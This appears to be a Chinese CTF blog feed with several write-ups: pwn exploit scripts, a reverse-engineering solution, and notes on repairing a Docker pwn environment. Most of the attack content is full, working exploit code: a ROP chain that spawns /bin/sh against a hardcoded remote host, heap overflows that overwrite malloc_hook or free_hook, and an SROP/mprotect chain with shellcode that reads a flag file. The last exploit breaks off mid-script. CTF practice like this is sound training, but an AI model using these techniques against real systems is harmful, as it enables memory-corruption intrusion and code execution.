123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201from pwn import *from struct import pack\# Padding goes hereimport base64context.log_level = 'debug'\# io = process('./pwn9')io = remote("111.33.164.4","50009")io.recvuntil("&gt;\n") s = base64.b64encode('n0van0va1')io.sendline(s)io.recvuntil('n0van0va')canary = u64(io.recv(8)) - 0x31log.info("canary --&gt; %s",hex(canary))io.recvuntil("continue ?")io.sendline("yes")p = ''p += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb080) # @ .datap += pack('&lt;Q', 0x00000000004715e4) # pop rax ; retp += '/bin//sh'p += pack('&lt;Q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x0000000000426baf) # xor rax, rax ; retp += pack('&lt;Q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp += pack('&lt;Q', 0x0000000000401e36) # pop rdi ; retp += pack('&lt;Q', 0x00000000006cb080) # @ .datap += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x00000000004433e6) # pop rdx ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x0000000000426baf) # xor rax, rax ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046fea5) # syscall ; retio.recvuntil("&gt;\n")pay = 'a'*8 + p64(canary) + p64(0) + ppayload = base64.b64encode(pay)\# gdb.attach(io,"b *0x401183")io.sendline(payload)io.recvuntil("continue ?")io.sendline("no")io.interactive() 玄冥同样edit函数没有检测size大小，所以有任意大小的堆溢出，而且程序使用malloc申请堆块可以泄漏出main_arena ，之后 利用堆溢出伪造堆块将malloc_hook填写为system_addr 再调用malloc(binsh_addr)get shell exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157from pwn import *context.log_level = 'debug'\# p = process('./pwn')local = 0if local:​ libc = elf.libcelse:​ p = remote("111.33.164.4","50007")​ elf = ELF('./pwn')​ libc = ELF('./libc6.so')​ print "remote"​ pause() sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size):​ ru("&gt;&gt;")​ sl('1')​ ru("size:")​ sl(str(size))def show(id):​ ru("&gt;&gt;")​ sl('2')​ ru("id:")​ sl(str(id))def edit(id,size,data):​ ru("&gt;&gt;")​ sl('3')​ ru("id:")​ sl(str(id))​ ru("size:")​ sl(str(size))​ ru("content:")​ sl(str(data))def delete(id):​ ru("&gt;&gt;")​ sl('4')​ ru("id:")​ sl(str(id))note_list = 0x6020E0add(0x80)#0add(0x10)#1delete(0)add(0x80)#0show(0)ru("data:")main_arena = u64(rc(6).ljust(8,'\x00')) - 88\# libc_base = main_arena - 0x3c4b20log.info("main_arena --&gt; %s",hex(main_arena))\# log.info("libc_base --&gt; %s",hex(libc_base))one = [0x41320,0x41374,0xd6e77]\# onegadget = libc_base + one[2]\# log.info("onegadget --&gt; %s",hex(onegadget))add(0x60)#2delete(2)pay = p64(0)*3 + p64(0x71) + p64(main_arena-0x33)*2edit(1,100,pay)add(0x60)#2add(0x60)#3pay = 0x13*'a' + p64(elf.plt['puts'])edit(3,0x30,pay)add(6299680)puts_addr = u64(rc(6).ljust(8,'\x00'))log.info("puts_addr --&gt; %s",hex(puts_addr))libc_base = puts_addr - libc.symbols['puts']onegadget = libc_base + one[1]system = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()log.info("libc_base --&gt; %s",hex(libc_base))log.info("onegadget --&gt; %s",hex(onegadget))log.info("system --&gt; %s",hex(system))log.info("binsh_addr --&gt; %s",hex(binsh_addr))\# gdb.attach(p)pay = 0x13*'a' + p64(system)edit(3,0x30,pay)add(binsh_addr)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[桂电2019 re write up]]></title>
    <url>%2F2020%2F06%2F21%2F%E6%A1%82%E7%94%B52019re%2F</url>
    <content type="text"><![CDATA[rechecksec 一下发现加了upx壳，upx -d 脱壳 IDA f5发现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_BOOL8 __fastcall sub_4009AE(char *a1)&#123; if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL;&#125; 只能说，出题人真无聊，不过也挺有耐心的，直接跑脚本 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;int main()&#123; string flag = "********************************"; flag[0] = (char)(166163712 / 1629056 ); flag[1] = (char)(731332800 / 6771600 ); flag[2] = (char)(357245568 / 3682944 ); flag[3] = (char)(1074393000 / 10431000 ); flag[4] = (char)(489211344 / 3977328 ); flag[5] = (char)(518971936 / 5138336 ); flag[6+1] = (char)(406741500 / 7532250 ); flag[7+1] = (char)(294236496 / 5551632 ); flag[8+1] = (char)(177305856 / 3409728 ); flag[9+1] = (char)(650683500 / 13013670 ); flag[10+1] = (char)(298351053 / 6088797 ); flag[11+1] = (char)(386348487 / 7884663 ); flag[12+1] = (char)(438258597 / 8944053 ); flag[13+1] = (char)(249527520 / 5198490 ); flag[14+1] = (char)(445362764 / 4544518 ); flag[16+1] = (char)(174988800 / 3645600 ); flag[15+1] = (char)(981182160 / 10115280 ); flag[17+1] = (char)(493042704 / 9667504 ); flag[18+1] = (char)(257493600 / 5364450 ); flag[19+1] = (char)(767478780 / 13464540 ); flag[20+1] = (char)(312840624 / 5488432 ); flag[21+1] = (char)(1404511500 / 14479500 ); flag[22+1] = (char)(316139670 / 6451830 ); flag[23+1] = (char)(619005024 / 6252576 ); flag[24+1] = (char)(372641472 / 7763364 ); flag[25+1] = (char)(373693320 / 7327320 ); flag[26+1] = (char)(498266640 / 8741520 ); flag[27+1] = (char)(452465676 / 8871876 ); flag[28+1] = (char)(208422720 / 4086720 ); flag[29+1] = (char)(515592000 / 9374400 ); flag[30+1] = (char)(719890500 / 5759124 ); cout&lt;&lt;flag&lt;&lt;endl; return 0; &#125; encrypt 主要对输入字符串 s 执行两次操作，第一次是异或 由于我在IDA并没有找到v9的值 ，所以从gdb上一个一个记录下来了，但是其实后来发现v9是由sub_4006b6得来的，但是懒得去逆这个函数了（反正数据我已经拿到了） 1data = [0x10,0x59,0x9c,0x92,0x6,0x22,0xcf,0xa5,0x72,0x1e,0x45,0x6a,0x6,0xcb,0x8,0xc3,0xe4,0x49,0x5a,0x63,0xc,0xdf,0xf6,0x5f,0x8,0x28,0xbd,0xe2,0x10,0x15,0x1f,0x6e,0xaa,0x5a,0xca,0xec,0x80,0xaf,0x9b,0x16,0xbb,0x3d,0x13,0x2f,0x6a,0xa4,0xc7,0x2e,0xbc,0x4b,0x60,0x9a] 异或后到了一个base64加密的位置，一开始我以为是base64加密，但是第一：没有表，第二：加了61，所以其实就是拿了base64移位的操作得到下标（0~64）然后+61变成可见字符 ，再跟’Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=’对应 所以，思路就很清晰了 1、这串字符串-61得到base64的下标，对应上base64表得到base64加密结果，再解密回去 2、异或data得到flag number_game这道 题还算挺有意思 的，搞到最后是一个数独 先检测输入，只能是[0,1,2,3,4] 这里用递归将输入放在了堆块中，为后面的乱序做准备 这里打乱输入顺序写入a2，其实就是递归查找，当下一个（+8）没有时，就写入，所以顺序就是7381940526 继续往下，就是填数独了，填完检测， 123451 4 # 2 33 0 # 1 #0 # 2 3 ## 3 # # 04 2 # # 1 123451 4 0 2 33 0 4 1 20 1 2 3 42 3 1 4 04 2 3 0 1 所以填入的数据 是0421421430，根据打乱的顺序排回去得到1134240024]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[docker内搭建2.29pwn环境遇到的坑]]></title>
    <url>%2F2020%2F06%2F21%2F%E6%90%AD%E5%BB%BA2.29pwn%E7%8E%AF%E5%A2%83%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[update 40412345678910111213141516171819202122232425Ign:1 http://security.ubuntu.com/ubuntu disco-security InReleaseIgn:2 http://archive.ubuntu.com/ubuntu disco InReleaseErr:3 http://security.ubuntu.com/ubuntu disco-security Release 404 Not Found [IP: 91.189.91.38 80]Ign:4 http://archive.ubuntu.com/ubuntu disco-updates InReleaseIgn:5 http://archive.ubuntu.com/ubuntu disco-backports InReleaseErr:6 http://archive.ubuntu.com/ubuntu disco Release 404 Not Found [IP: 91.189.88.152 80]Err:7 http://archive.ubuntu.com/ubuntu disco-updates Release 404 Not Found [IP: 91.189.88.152 80]Err:8 http://archive.ubuntu.com/ubuntu disco-backports Release 404 Not Found [IP: 91.189.88.152 80]Reading package lists... DoneE: The repository 'http://security.ubuntu.com/ubuntu disco-security Release' does not have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://archive.ubuntu.com/ubuntu disco Release' does not have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://archive.ubuntu.com/ubuntu disco-updates Release' does not have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.E: The repository 'http://archive.ubuntu.com/ubuntu disco-backports Release' does not have a Release file.N: Updating from such a repository can't be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details. 原因，Ubuntu 更新换代很快. 你的ubuntu一旦不是最新版本后，其仓库 （repository）就会被移到另外的服务器上面。所以不再是 http://archive.ubuntu.com/ubuntu/dist/ 这里能找到的。 解决方法修改souse.list文件内容为阿里源，由于没有vim，所以通过echo一条一条加进去 12345678910echo "deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" &gt; /etc/apt/sources.listecho "deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse" &gt;&gt; /etc/apt/sources.listecho "deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse" &gt;&gt; /etc/apt/sources.list 之后中apt-get update 安装 git 报错1234567891011121314# apt-get install git -yReading package lists... DoneBuilding dependency tree Reading state information... DoneSome packages could not be installed. This may mean that you haverequested an impossible situation or if you are using the unstabledistribution that some required packages have not yet been createdor been moved out of Incoming.The following information may help to resolve the situation:The following packages have unmet dependencies: git : Depends: perl but it is not going to be installed Depends: liberror-perl but it is not going to be installedE: Unable to correct problems, you have held broken packages. 原因，上面阿里面源的问题，将souse.list替换为以下内容即可（都是找错源惹的祸） 12345678910deb http://mirrors.aliyun.com/ubuntu/ eoan main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ eoan main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ eoan-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ eoan-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ eoan-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ eoan-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ eoan-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ eoan-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ eoan-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ eoan-proposed main restricted universe multiverse apt-get install libc6-dbg:i386 -y报错1E: Unable to locate package libc6-dbg:i386 解决方法： 12dpkg --add-architecture i386apt-get update 安装pwntools报错 1234567 9 | #include &lt;Python.h&gt; | ^~~~~~~~~~ compilation terminated. error: command 'x86_64-linux-gnu-gcc' failed with exit status 1 ----------------------------------------Command "/usr/bin/python -u -c "import setuptools, tokenize;__file__='/tmp/pip-build-NpJNGt/psutil/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))" install --record /tmp/pip-NUGJYX-record/install-record.txt --single-version-externally-managed --compile" failed with error code 1 in /tmp/pip-build-NpJNGt/psutil/ 解决方法 python2: 1234apt-get install python-dev \build-essential libssl-dev libffi-dev \libxml2-dev libxslt1-dev zlib1g-dev \python-pip python3: 1234apt-get install python3 python-dev python3-dev \build-essential libssl-dev libffi-dev \libxml2-dev libxslt1-dev zlib1g-dev \python-pip python2亲测有效，python3不知道]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UNCTF-orwheap]]></title>
    <url>%2F2020%2F06%2F21%2FUNCTF-orwheap%2F</url>
    <content type="text"><![CDATA[123456789101112131415$ seccomp-tools dump ./pwn line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL 如题目，禁用了system，所以onegadget就用了不了，还是第一次在堆题目上遇到orw的 程序功能： 12341.AddNote2.DelNote3.EditNote4.Exit 在addnote功能中自己定义的read函数中存在两个字节的漏出，这是题目唯一的洞，其它功能正常。 1234567891011121314151617181920212223242526// 溢出两个字节unsigned __int64 __fastcall read_n(__int64 a1, __int64 a2)&#123; int i; // [rsp+1Ch] [rbp-34h] __int64 buf; // [rsp+20h] [rbp-30h] __int64 v5; // [rsp+28h] [rbp-28h] __int64 v6; // [rsp+30h] [rbp-20h] __int64 v7; // [rsp+38h] [rbp-18h] unsigned __int64 v8; // [rsp+48h] [rbp-8h] v8 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; for ( i = 0; i &lt; (unsigned __int64)(a2 + 1); ++i ) &#123; if ( read(0, &amp;buf, 1uLL) &lt;= 0 ) exit(0); if ( (_BYTE)buf == 10 ) break; *(_BYTE *)(a1 + i) = buf; &#125; *(_BYTE *)(i + a1) = 0; return __readfsqword(0x28u) ^ v8;&#125; 那么，先漏泄地址，没有show函数，所以只能攻击IO_file，就利用这两个字节的溢出来构造chunk 大概的思路就是先申请4个chunk(0x70,0x80,0x70,0x70)，利用溢出的两字节修改chunk1为0xf0，这样chunk2就被chunk1包住，再free(1),free(2),malloc(0x80)，就能将main_arena+88写到free状态的chunk2，再修改低两字节到_IO_2_1_stdout_上方 123456789101112131415161718add(0x68,'a')add(0x78,'b')add(0x68,(p64(0) + p64(0x21))*6)add(0x68,(p64(0) + p64(0x21))*6)delete(0)add(0x68,'a'*0x60 + p64(0) + '\xf1',0)delete(1)delete(2)add(0x78,'b')delete(0)add(0x68,'a'*0x60 + p64(0) + '\xa1')delete(1)add(0x98,'a')edit(1,0x70*'a' + p64(0) + p64(0x71) + '\xdd\x25')add(0x68,'b')add(0x68,0x33*'\x00' + p64(0xfbad1800) + p64(0)*3)#0x10 接下来因为程序禁用了system，onegadget用不了，通过EX师傅学到了一种新姿势 接下来可以将free_hook填写成setcontex+53，再进行SROP调用mprotect获得一段可执行的段，再shellcode读出flag exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#coding:utf-8from pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,message,flag=1): sla("Choice: ",'1') sla("size: ",str(size)) if flag: sla("content: ",message) else: sda("content: ",message)def delete(idx): sla("Choice: ",'2') sla("idx: ",str(idx))def edit(idx,message): sla("Choice: ",'3') sla("idx: ",str(idx)) sda("content: ",message)def pwn(): add(0x68,'a') add(0x78,'b') add(0x68,(p64(0) + p64(0x21))*6) add(0x68,(p64(0) + p64(0x21))*6) delete(0) add(0x68,'a'*0x60 + p64(0) + '\xf1',0) delete(1) delete(2) add(0x78,'b') delete(0) add(0x68,'a'*0x60 + p64(0) + '\xa1') delete(1) add(0x98,'a') edit(1,0x70*'a' + p64(0) + p64(0x71) + '\xdd\x25') add(0x68,'b') add(0x68,0x33*'\x00' + p64(0xfbad1800) + p64(0)*3)#0x10 libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600 free_hook = libc_base + libc.symbols['__free_hook'] setcontext = libc_base + libc.symbols['setcontext'] syscall = libc_base + 0xbc375 pop_rdi = libc_base + 0x21102 pop_rsi = libc_base + 0x202e8 pop_rdx = libc_base + 0x1b92 pop_rax = libc_base + 0x33544 jmp_rsp = libc_base + 0x2a71 log.success("libc_base --&gt; %s",hex(libc_base)) log.success("free_hook --&gt; %s",hex(free_hook)) log.success("syscall --&gt; %s",hex(syscall)) # pause() # unsorted bin attack edit(1,0x70*'a' + p64(0) + p64(0x91)) delete(2) edit(1,0x70*'a' + p64(0) + p64(0x91) + p64(free_hook-0x20)*2) add(0x88,'b') # fastbin attack edit(1,0x70*'a' + p64(0) + p64(0x71)) delete(2) edit(1,0x70*'a' + p64(0) + p64(0x71) + p64(free_hook-0x13)) frame = SigreturnFrame() frame.rdi = 0 frame.rsi = free_hook &amp; 0xfffffffffffff000 frame.rdx = 0x2000 frame.rsp = free_hook &amp; 0xfffffffffffff000 frame.rip = syscall pay = str(frame) # x = 0 # with open("pay","w+") as f: # for i in pay: # if x%8 == 0: # f.write('\n') # f.write(i) # x += 1 # f.close() add(0x68,pay[0x80:0x80+0x60])#2 add(0x68,'a'*3 + p64(setcontext+53)) edit(1,pay[:0x80]) # debug(0xcbd) delete(1) # call mprotect-jmp to shellcode shellcode = ''' /*fp = open("flag")*/ push 0x67616c66 mov rdi,rsp xor rsi,rsi xor rdx,rdx mov rax,2 syscall /*read(fp,buf,0x30)*/ mov rdi,rax mov rsi,rsp mov rdx,0x30 xor rax,rax syscall /*write(1,buf,0x30)*/ mov rdi,1 mov rax,1 syscall ''' pay = p64(pop_rdi) + p64(free_hook &amp; 0xfffffffffffff000) pay += p64(pop_rsi) + p64(0x2000) pay += p64(pop_rdx) + p64(7) pay += p64(pop_rax) + p64(0xa) pay += p64(syscall) + p64(jmp_rsp) pay += asm(shellcode) sl(pay) # debug() p.interactive()while 1: try: pwn() except Exception: p.close() if local: p = process('./pwn') else: p = remote("") # elf = ELF('./') continue]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巅峰极客 pwn 题解]]></title>
    <url>%2F2020%2F06%2F21%2F%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[pwn很骚的一题，又是将system禁用的堆类型题目 12345678910111213$ seccomp-tools dump ./pwn2 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x06 0xc000003e if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x04 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0008 0004: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0009 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0009 0007: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0009 0008: 0x06 0x00 0x00 0x00000000 return KILL 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 程序功能： 123451. Add note2. Delete note3: Show note4. Change5. Exit 但是change函数并没有啥用，因为它只会读随机数进去fread(v3, 1uLL, *v2, stream);但是谁能想到最后就是拿它来打印flag的呢 Add没什么特别，除了不能申请fastbin范围地堆外 delete有UAF 1234567891011121314151617int delete()&#123; __int64 v0; // rbx unsigned __int64 v1; // rax void *v2; // rdi v0 = qword_2020B8; puts("input your index:"); v1 = sub_E60(); if ( v1 &gt; 0xF || (v2 = *(void **)(v0 + 16 * v1 + 8)) == 0LL ) &#123; puts("out of range or note not exist"); exit(-1); &#125; free(v2); // UAF return puts("note delete success!!!");&#125; show函数也是真实可用的，那么泄露地址就很简单 不过这题跟常规题的差别就在于，禁用了system，所以很香的onegadget就没啥用了，这种orwheap只能通过srop来打印flag 12345思路：1、通过UAF泄漏出堆、libc地址2、攻击global_max_fast使得可以进行fastbin attack3、伪造stream的table执行setcontext + 0x35，再跳转到构造好的orw rop链上打印flag(因为stream结构体是放在堆上的，所以可以直接利用UAF将它申请出来修改) exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./pwn2') elf = ELF('./pwn2') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x2020B8) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(id,size,data): sla("Choice:",'1') sla("index:",str(id)) sla("size:",str(size)) sla("context:\n",data)def delete(id): sla("Choice:",'2') sla("index:",str(id))def show(id): 